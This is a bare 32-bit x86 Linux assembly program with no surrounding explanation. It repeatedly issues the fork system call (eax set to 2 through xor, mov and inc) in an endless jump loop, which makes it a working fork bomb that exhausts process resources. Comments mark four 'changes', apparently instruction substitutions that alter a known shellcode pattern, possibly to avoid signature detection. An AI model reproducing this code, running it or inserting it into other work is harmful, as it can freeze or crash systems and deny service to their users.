global _start

section .text
_start:
    xor eax, eax                ; change #1
    mov al, 1                   ; change #2
    inc eax                     ; change #3
    int 0x80            
    jmp _start                  ; change #4
